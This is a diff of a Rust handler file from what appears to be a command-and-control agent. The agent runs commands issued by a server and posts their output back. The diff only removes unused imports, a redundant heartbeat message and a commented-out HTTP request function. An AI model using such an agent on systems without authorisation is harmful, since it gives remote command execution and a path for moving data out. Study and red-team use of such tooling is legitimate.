@@ -1,11 +1,8 @@
 use crate::agent::AgentContext;
-use std::fs;
-use std::io::Write;
 use std::process::Output;
 use talaria::protocol::*;
 use tokio::io;
 use tokio::io::AsyncWriteExt;
-use tokio::process::Command as OtherCommand;
 
 /// Handles responses from the server.
 use std::process::Command;
@@ -50,16 +47,6 @@ pub async fn handle_response(agent: &mut AgentContext, response: AgentInstructio
 
             // Send the response back to the server with the actual command output
             make_request(agent, agent_response).await;
-
-            // Additionally, set the response from the command as the "heartbeat" to simulate the keepalive response
-            // Sending the command output as the heartbeat instead of a static "Hello from server!" message
-            let heartbeat_response = AgentResponse {
-                packet_header: agent.generate_packet_header(),
-                packet_body: AgentResponseBody::Heartbeat, // Using the command output as the heartbeat
-            };
-
-            // Send the heartbeat response with command output to the server
-            make_request(agent, heartbeat_response).await;
         }
         AgentInstructionBody::RequestHeartbeat => {
             println!("Received heartbeat request from server.");
@@ -145,33 +132,3 @@ async fn make_request(
         Err(_) => None,
     }
 }
-
-//
-//async fn make_request(
-// agent: &mut AgentContext,
-//   request: AgentResponse,
-//) -> Option<AgentInstruction> {
-//    // agent.send_log.push(request.clone());
-//
-//    let request = AgentResponse::serialize(&request);
-//    let response = agent
-//        .http_client
-//        .post(agent.server_addr.clone() + "/agent/monolith")
-//        .body(request)
-//        .send()
-//        .await;
-//
-//   match response {
-//        Ok(response) => {
-//            let bytes = response.bytes().await.unwrap();
-//            let instruction = AgentInstruction::deserialize(&bytes.to_vec());
-//            // agent.rec_log.push(Ok(instruction.clone()));
-//            Some(instruction)
-//        }
-//        Err(error) => {
-//            // agent.rec_log.push(Err(error));
-//            None
-//        }
-//    }
-//}
-
